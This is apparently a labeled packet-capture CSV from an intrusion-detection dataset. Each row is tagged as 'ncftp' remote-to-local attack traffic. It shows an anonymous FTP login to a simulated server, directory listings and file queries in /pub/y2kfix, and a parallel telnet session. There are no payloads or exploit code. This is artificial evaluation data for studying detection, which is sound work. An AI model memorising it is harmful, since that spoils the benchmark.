"ncftp"," r2l", "3017528","21:45:07.079180","172.16.118.20","172.16.114.50","TCP","60","21 → 6207 [SYN, ACK] Seq=0 Ack=1 Win=32736 Len=0 MSS=1460"
"ncftp"," r2l", "3017529","21:45:07.079408","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=1 Ack=1 Win=31744 Len=0"
"ncftp"," r2l", "3017530","21:45:07.094755","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=120 Ack=468 Win=32120 Len=0"
"ncftp"," r2l", "3017531","21:45:07.095015","172.16.114.50","172.16.118.20","TELNET","93","Telnet Data ..."
"ncftp"," r2l", "3017532","21:45:07.114712","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=120 Ack=507 Win=32120 Len=0"
"ncftp"," r2l", "3017533","21:45:07.201509","172.16.118.20","172.16.114.50","FTP","163","Response: 220 linux2.eyrie.af.mil FTP server (Version wu-2.4.2-academ[BETA-18](1) Mon Aug 3 19:17:20 EDT 1998) ready."
"ncftp"," r2l", "3017534","21:45:07.201975","172.16.114.50","172.16.118.20","FTP","70","Request: USER anonymous"
"ncftp"," r2l", "3017535","21:45:07.214693","172.16.118.20","172.16.114.50","TCP","60","21 → 6207 [ACK] Seq=110 Ack=17 Win=32736 Len=0"
"ncftp"," r2l", "3017536","21:45:07.259823","172.16.118.20","172.16.114.50","FTP","122","Response: 331 Guest login ok, send your complete e-mail address as password."
"ncftp"," r2l", "3017537","21:45:07.260163","172.16.114.50","172.16.118.20","FTP","84","Request: PASS bramy@marx.eyrie.af.mil"
"ncftp"," r2l", "3017538","21:45:07.274679","172.16.118.20","172.16.114.50","TCP","60","21 → 6207 [ACK] Seq=178 Ack=47 Win=32736 Len=0"
"ncftp"," r2l", "3017539","21:45:07.290509","","","LOOP","60","Reply"
"ncftp"," r2l", "3017540","21:45:07.309045","172.16.118.20","172.16.114.50","FTP","102","Response: 230 Guest login ok, access restrictions apply."
"ncftp"," r2l", "3017541","21:45:07.309487","172.16.114.50","172.16.118.20","TELNET","98","Telnet Data ..."
"ncftp"," r2l", "3017542","21:45:07.309718","172.16.114.50","172.16.118.20","FTP","64","Request: CWD /pub"
"ncftp"," r2l", "3017543","21:45:07.324658","172.16.118.20","172.16.114.50","TCP","60","21 → 6207 [ACK] Seq=226 Ack=57 Win=32736 Len=0"
"ncftp"," r2l", "3017544","21:45:07.324727","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=120 Ack=551 Win=32120 Len=0"
"ncftp"," r2l", "3017545","21:45:07.327695","172.16.118.20","172.16.114.50","FTP","83","Response: 250 CWD command successful."
"ncftp"," r2l", "3017546","21:45:07.328045","172.16.114.50","172.16.118.20","FTP","60","Request: PWD"
"ncftp"," r2l", "3017547","21:45:07.328882","172.16.118.20","172.16.114.50","FTP","88","Response: 257 /pub" is current directory.""
"ncftp"," r2l", "3017548","21:45:07.343960","172.16.114.50","172.16.118.20","TELNET","66","Telnet Data ..."
"ncftp"," r2l", "3017549","21:45:07.344335","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=62 Ack=289 Win=31744 Len=0"
"ncftp"," r2l", "3017550","21:45:07.354652","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=120 Ack=563 Win=32120 Len=0"
"ncftp"," r2l", "3017551","21:45:07.455433","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017552","21:45:07.455801","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017553","21:45:07.474618","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=121 Ack=564 Win=32120 Len=0"
"ncftp"," r2l", "3017554","21:45:07.554740","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017555","21:45:07.555091","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017556","21:45:07.574610","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=122 Ack=565 Win=32120 Len=0"
"ncftp"," r2l", "3017557","21:45:07.636144","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017558","21:45:07.636483","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017559","21:45:07.637093","172.16.114.50","172.16.118.20","FTP","81","Request: PORT 172,16,114,50,24,112"
"ncftp"," r2l", "3017560","21:45:07.652289","172.16.118.20","172.16.114.50","FTP","84","Response: 200 PORT command successful."
"ncftp"," r2l", "3017561","21:45:07.652591","172.16.114.50","172.16.118.20","FTP","64","Request: NLST -CF"
"ncftp"," r2l", "3017562","21:45:07.654565","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=124 Ack=567 Win=32120 Len=0"
"ncftp"," r2l", "3017563","21:45:07.662799","172.16.118.20","172.16.114.50","TCP","60","20 → 6256 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017564","21:45:07.663080","172.16.114.50","172.16.118.20","TCP","60","6256 → 20 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"ncftp"," r2l", "3017565","21:45:07.663508","172.16.118.20","172.16.114.50","TCP","60","20 → 6256 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017566","21:45:07.663824","172.16.118.20","172.16.114.50","FTP","107","Response: 150 Opening ASCII mode data connection for /bin/ls."
"ncftp"," r2l", "3017567","21:45:07.674261","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=99 Ack=372 Win=31744 Len=0"
"ncftp"," r2l", "3017568","21:45:07.745539","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017569","21:45:07.745870","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017570","21:45:07.764533","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=125 Ack=568 Win=32120 Len=0"
"ncftp"," r2l", "3017571","21:45:07.774655","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017572","21:45:07.774957","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017573","21:45:07.794524","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=126 Ack=569 Win=32120 Len=0"
"ncftp"," r2l", "3017574","21:45:07.804647","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017575","21:45:07.804950","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017576","21:45:07.824520","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=127 Ack=570 Win=32120 Len=0"
"ncftp"," r2l", "3017577","21:45:07.824698","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017578","21:45:07.825002","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017579","21:45:07.844512","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=128 Ack=571 Win=32120 Len=0"
"ncftp"," r2l", "3017580","21:45:07.864631","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017581","21:45:07.864931","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017582","21:45:07.884502","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=129 Ack=572 Win=32120 Len=0"
"ncftp"," r2l", "3017583","21:45:07.894620","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017584","21:45:07.894922","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017585","21:45:07.914493","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=130 Ack=573 Win=32120 Len=0"
"ncftp"," r2l", "3017586","21:45:07.916267","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017587","21:45:07.916580","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017588","21:45:07.934481","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=132 Ack=575 Win=32120 Len=0"
"ncftp"," r2l", "3017589","21:45:08.025223","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017590","21:45:08.025521","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017591","21:45:08.044456","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=133 Ack=576 Win=32120 Len=0"
"ncftp"," r2l", "3017592","21:45:08.094586","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017593","21:45:08.094886","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017594","21:45:08.114434","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=134 Ack=577 Win=32120 Len=0"
"ncftp"," r2l", "3017595","21:45:08.135900","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017596","21:45:08.136213","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017597","21:45:08.154421","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=136 Ack=579 Win=32120 Len=0"
"ncftp"," r2l", "3017598","21:45:08.236210","172.16.118.20","172.16.114.50","FTP-DATA","63","FTP Data: 9 bytes"
"ncftp"," r2l", "3017599","21:45:08.236341","172.16.118.20","172.16.114.50","FTP","78","Response: 226 Transfer complete."
"ncftp"," r2l", "3017600","21:45:08.236408","172.16.118.20","172.16.114.50","TCP","60","20 → 6256 [FIN, ACK] Seq=10 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017601","21:45:08.236623","172.16.114.50","172.16.118.20","TCP","60","6256 → 20 [ACK] Seq=1 Ack=11 Win=31744 Len=0"
"ncftp"," r2l", "3017602","21:45:08.236781","172.16.114.50","172.16.118.20","TELNET","63","Telnet Data ..."
"ncftp"," r2l", "3017603","21:45:08.236945","172.16.114.50","172.16.118.20","TCP","60","6256 → 20 [FIN, ACK] Seq=1 Ack=11 Win=31744 Len=0"
"ncftp"," r2l", "3017604","21:45:08.237353","172.16.118.20","172.16.114.50","TCP","60","20 → 6256 [ACK] Seq=11 Ack=2 Win=32120 Len=0"
"ncftp"," r2l", "3017605","21:45:08.238251","172.16.114.50","172.16.118.20","FTP","63","Request: CWD pub"
"ncftp"," r2l", "3017606","21:45:08.239016","172.16.118.20","172.16.114.50","FTP","91","Response: 550 pub: No such file or directory."
"ncftp"," r2l", "3017607","21:45:08.239446","172.16.114.50","172.16.118.20","FTP","60","Request: PWD"
"ncftp"," r2l", "3017608","21:45:08.240206","172.16.118.20","172.16.114.50","FTP","88","Response: 257 /pub" is current directory.""
"ncftp"," r2l", "3017609","21:45:08.241233","172.16.114.50","172.16.118.20","FTP","81","Request: PORT 172,16,114,50,24,114"
"ncftp"," r2l", "3017610","21:45:08.241868","172.16.118.20","172.16.114.50","FTP","84","Response: 200 PORT command successful."
"ncftp"," r2l", "3017611","21:45:08.242184","172.16.114.50","172.16.118.20","FTP","64","Request: NLST -CF"
"ncftp"," r2l", "3017612","21:45:08.243704","172.16.118.20","172.16.114.50","TCP","60","20 → 6258 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017613","21:45:08.243968","172.16.114.50","172.16.118.20","TCP","60","6258 → 20 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"ncftp"," r2l", "3017614","21:45:08.244382","172.16.118.20","172.16.114.50","TCP","60","20 → 6258 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017615","21:45:08.244672","172.16.118.20","172.16.114.50","FTP","107","Response: 150 Opening ASCII mode data connection for /bin/ls."
"ncftp"," r2l", "3017616","21:45:08.249102","172.16.118.20","172.16.114.50","FTP-DATA","63","FTP Data: 9 bytes"
"ncftp"," r2l", "3017617","21:45:08.249256","172.16.118.20","172.16.114.50","TCP","60","20 → 6258 [FIN, ACK] Seq=10 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017618","21:45:08.249472","172.16.114.50","172.16.118.20","TCP","60","6258 → 20 [ACK] Seq=1 Ack=11 Win=31744 Len=0"
"ncftp"," r2l", "3017619","21:45:08.249674","172.16.114.50","172.16.118.20","TCP","60","6258 → 20 [FIN, ACK] Seq=1 Ack=11 Win=31744 Len=0"
"ncftp"," r2l", "3017620","21:45:08.250066","172.16.118.20","172.16.114.50","TCP","60","20 → 6258 [ACK] Seq=11 Ack=2 Win=32120 Len=0"
"ncftp"," r2l", "3017621","21:45:08.254390","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=136 Ack=588 Win=32120 Len=0"
"ncftp"," r2l", "3017622","21:45:08.254671","172.16.114.50","172.16.118.20","TELNET","132","Telnet Data ..."
"ncftp"," r2l", "3017623","21:45:08.264142","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=150 Ack=550 Win=31744 Len=0"
"ncftp"," r2l", "3017624","21:45:08.264582","172.16.118.20","172.16.114.50","FTP","78","Response: 226 Transfer complete."
"ncftp"," r2l", "3017625","21:45:08.274390","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=136 Ack=666 Win=32120 Len=0"
"ncftp"," r2l", "3017626","21:45:08.274620","172.16.114.50","172.16.118.20","TELNET","66","Telnet Data ..."
"ncftp"," r2l", "3017627","21:45:08.284134","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=150 Ack=574 Win=31744 Len=0"
"ncftp"," r2l", "3017628","21:45:08.294384","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=136 Ack=678 Win=32120 Len=0"
"ncftp"," r2l", "3017629","21:45:13.144268","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017630","21:45:13.144668","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017631","21:45:13.163028","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=137 Ack=679 Win=32120 Len=0"
"ncftp"," r2l", "3017632","21:45:13.173140","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017633","21:45:13.173489","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017634","21:45:13.193010","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=138 Ack=680 Win=32120 Len=0"
"ncftp"," r2l", "3017635","21:45:13.193187","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017636","21:45:13.193538","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017637","21:45:13.213007","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=139 Ack=681 Win=32120 Len=0"
"ncftp"," r2l", "3017638","21:45:13.213181","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017639","21:45:13.213534","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017640","21:45:13.233003","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=140 Ack=682 Win=32120 Len=0"
"ncftp"," r2l", "3017641","21:45:13.233175","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017642","21:45:13.233528","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017643","21:45:13.252994","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=141 Ack=683 Win=32120 Len=0"
"ncftp"," r2l", "3017644","21:45:13.253165","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017645","21:45:13.253516","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017646","21:45:13.272988","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=142 Ack=684 Win=32120 Len=0"
"ncftp"," r2l", "3017647","21:45:13.273158","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017648","21:45:13.273510","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017649","21:45:13.292981","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=143 Ack=685 Win=32120 Len=0"
"ncftp"," r2l", "3017650","21:45:13.303100","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017651","21:45:13.303451","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017652","21:45:13.322979","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=144 Ack=686 Win=32120 Len=0"
"ncftp"," r2l", "3017653","21:45:13.323152","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017654","21:45:13.323504","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017655","21:45:13.342966","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=145 Ack=687 Win=32120 Len=0"
"ncftp"," r2l", "3017656","21:45:13.343143","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017657","21:45:13.343495","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017658","21:45:13.362963","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=146 Ack=688 Win=32120 Len=0"
"ncftp"," r2l", "3017659","21:45:13.373078","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017660","21:45:13.373429","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017661","21:45:13.392954","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=147 Ack=689 Win=32120 Len=0"
"ncftp"," r2l", "3017662","21:45:13.403072","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017663","21:45:13.403423","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017664","21:45:13.422950","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=148 Ack=690 Win=32120 Len=0"
"ncftp"," r2l", "3017665","21:45:13.423130","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017666","21:45:13.423482","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017667","21:45:13.442945","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=149 Ack=691 Win=32120 Len=0"
"ncftp"," r2l", "3017668","21:45:13.444633","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017669","21:45:13.444966","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017670","21:45:13.445359","172.16.114.50","172.16.118.20","FTP","81","Request: PORT 172,16,114,50,24,118"
"ncftp"," r2l", "3017671","21:45:13.446061","172.16.118.20","172.16.114.50","FTP","84","Response: 200 PORT command successful."
"ncftp"," r2l", "3017672","21:45:13.446391","172.16.114.50","172.16.118.20","FTP","70","Request: LIST -d y2kfix"
"ncftp"," r2l", "3017673","21:45:13.448041","172.16.118.20","172.16.114.50","TCP","60","20 → 6262 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017674","21:45:13.448305","172.16.114.50","172.16.118.20","TCP","60","6262 → 20 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"ncftp"," r2l", "3017675","21:45:13.448703","172.16.118.20","172.16.114.50","TCP","60","20 → 6262 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017676","21:45:13.453177","172.16.118.20","172.16.114.50","FTP","107","Response: 150 Opening ASCII mode data connection for /bin/ls."
"ncftp"," r2l", "3017677","21:45:13.462940","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=151 Ack=693 Win=32120 Len=0"
"ncftp"," r2l", "3017678","21:45:13.473066","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=193 Ack=657 Win=31744 Len=0"
"ncftp"," r2l", "3017679","21:45:13.633261","172.16.118.20","172.16.114.50","FTP-DATA","117","FTP Data: 63 bytes"
"ncftp"," r2l", "3017680","21:45:13.633342","172.16.118.20","172.16.114.50","FTP","78","Response: 226 Transfer complete."
"ncftp"," r2l", "3017681","21:45:13.633414","172.16.118.20","172.16.114.50","TCP","60","20 → 6262 [FIN, ACK] Seq=64 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017682","21:45:13.633627","172.16.114.50","172.16.118.20","TCP","60","6262 → 20 [ACK] Seq=1 Ack=65 Win=31744 Len=0"
"ncftp"," r2l", "3017683","21:45:13.633772","172.16.114.50","172.16.118.20","TCP","60","6262 → 20 [FIN, ACK] Seq=1 Ack=65 Win=31744 Len=0"
"ncftp"," r2l", "3017684","21:45:13.634168","172.16.114.50","172.16.118.20","FTP","81","Request: PORT 172,16,114,50,24,127"
"ncftp"," r2l", "3017685","21:45:13.634239","172.16.118.20","172.16.114.50","TCP","60","20 → 6262 [ACK] Seq=65 Ack=2 Win=32120 Len=0"
"ncftp"," r2l", "3017686","21:45:13.634807","172.16.118.20","172.16.114.50","FTP","84","Response: 200 PORT command successful."
"ncftp"," r2l", "3017687","21:45:13.635125","172.16.114.50","172.16.118.20","FTP","75","Request: NLST -F /pub/y2kfix"
"ncftp"," r2l", "3017688","21:45:13.636662","172.16.118.20","172.16.114.50","TCP","60","20 → 6271 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017689","21:45:13.636906","172.16.114.50","172.16.118.20","TCP","60","6271 → 20 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"ncftp"," r2l", "3017690","21:45:13.637318","172.16.118.20","172.16.114.50","TCP","60","20 → 6271 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017691","21:45:13.641514","172.16.118.20","172.16.114.50","FTP","107","Response: 150 Opening ASCII mode data connection for /bin/ls."
"ncftp"," r2l", "3017692","21:45:13.653026","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [ACK] Seq=241 Ack=764 Win=31744 Len=0"
"ncftp"," r2l", "3017693","21:45:13.655746","172.16.118.20","172.16.114.50","FTP-DATA","87","FTP Data: 33 bytes"
"ncftp"," r2l", "3017694","21:45:13.655849","172.16.118.20","172.16.114.50","FTP","78","Response: 226 Transfer complete."
"ncftp"," r2l", "3017695","21:45:13.655919","172.16.118.20","172.16.114.50","TCP","60","20 → 6271 [FIN, ACK] Seq=34 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017696","21:45:13.656134","172.16.114.50","172.16.118.20","TCP","60","6271 → 20 [ACK] Seq=1 Ack=35 Win=31744 Len=0"
"ncftp"," r2l", "3017697","21:45:13.657501","172.16.114.50","172.16.118.20","TCP","60","6271 → 20 [FIN, ACK] Seq=1 Ack=35 Win=31744 Len=0"
"ncftp"," r2l", "3017698","21:45:13.657695","172.16.114.50","172.16.118.20","FTP","62","Request: TYPE I"
"ncftp"," r2l", "3017699","21:45:13.657908","172.16.118.20","172.16.114.50","TCP","60","20 → 6271 [ACK] Seq=35 Ack=2 Win=32120 Len=0"
"ncftp"," r2l", "3017700","21:45:13.658292","172.16.118.20","172.16.114.50","FTP","74","Response: 200 Type set to I."
"ncftp"," r2l", "3017701","21:45:13.658601","172.16.114.50","172.16.118.20","FTP","80","Request: SIZE /pub/y2kfix/INSTALL"
"ncftp"," r2l", "3017702","21:45:13.659250","172.16.118.20","172.16.114.50","FTP","63","Response: 213 120"
"ncftp"," r2l", "3017703","21:45:13.659559","172.16.114.50","172.16.118.20","FTP","80","Request: MDTM /pub/y2kfix/INSTALL"
"ncftp"," r2l", "3017704","21:45:13.660256","172.16.118.20","172.16.114.50","FTP","74","Response: 213 19990327070346"
"ncftp"," r2l", "3017705","21:45:13.661843","172.16.114.50","172.16.118.20","TELNET","89","Telnet Data ..."
"ncftp"," r2l", "3017706","21:45:13.662003","172.16.114.50","172.16.118.20","FTP","81","Request: SIZE /pub/y2kfix/Makefile"
"ncftp"," r2l", "3017707","21:45:13.662712","172.16.118.20","172.16.114.50","FTP","64","Response: 213 2431"
"ncftp"," r2l", "3017708","21:45:13.663052","172.16.114.50","172.16.118.20","FTP","81","Request: MDTM /pub/y2kfix/Makefile"
"ncftp"," r2l", "3017709","21:45:13.663704","172.16.118.20","172.16.114.50","FTP","74","Response: 213 19990327071106"
"ncftp"," r2l", "3017710","21:45:13.665136","172.16.114.50","172.16.118.20","FTP","79","Request: SIZE /pub/y2kfix/README"
"ncftp"," r2l", "3017711","21:45:13.665741","172.16.118.20","172.16.114.50","FTP","63","Response: 213 103"
"ncftp"," r2l", "3017712","21:45:13.666057","172.16.114.50","172.16.118.20","FTP","79","Request: MDTM /pub/y2kfix/README"
"ncftp"," r2l", "3017713","21:45:13.666704","172.16.118.20","172.16.114.50","FTP","74","Response: 213 19990327070507"
"ncftp"," r2l", "3017714","21:45:13.668375","172.16.114.50","172.16.118.20","FTP","62","Request: TYPE A"
"ncftp"," r2l", "3017715","21:45:13.668942","172.16.118.20","172.16.114.50","FTP","74","Response: 200 Type set to A."
"ncftp"," r2l", "3017716","21:45:13.669408","172.16.114.50","172.16.118.20","FTP","81","Request: PORT 172,16,114,50,24,178"
"ncftp"," r2l", "3017717","21:45:13.670037","172.16.118.20","172.16.114.50","FTP","84","Response: 200 PORT command successful."
"ncftp"," r2l", "3017718","21:45:13.670363","172.16.114.50","172.16.118.20","FTP","79","Request: NLST -F /pub/y2kfix/src"
"ncftp"," r2l", "3017719","21:45:13.671841","172.16.118.20","172.16.114.50","TCP","60","20 → 6322 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"ncftp"," r2l", "3017720","21:45:13.672084","172.16.114.50","172.16.118.20","TCP","60","6322 → 20 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"ncftp"," r2l", "3017721","21:45:13.672479","172.16.118.20","172.16.114.50","TCP","60","20 → 6322 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"ncftp"," r2l", "3017722","21:45:13.672872","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=151 Ack=728 Win=32120 Len=0"
"ncftp"," r2l", "3017723","21:45:13.673157","172.16.114.50","172.16.118.20","TELNET","124","Telnet Data ..."
"ncftp"," r2l", "3017724","21:45:13.673628","172.16.118.20","172.16.114.50","FTP","107","Response: 150 Opening ASCII mode data connection for /bin/ls."
"ncftp"," r2l", "3017725","21:45:13.684173","172.16.118.20","172.16.114.50","FTP-DATA","217","FTP Data: 163 bytes"
"ncftp"," r2l", "3017726","21:45:13.684240","172.16.118.20","172.16.114.50","TCP","60","20 → 6322 [FIN, ACK] Seq=164 Ack=1 Win=32120 Len=0"
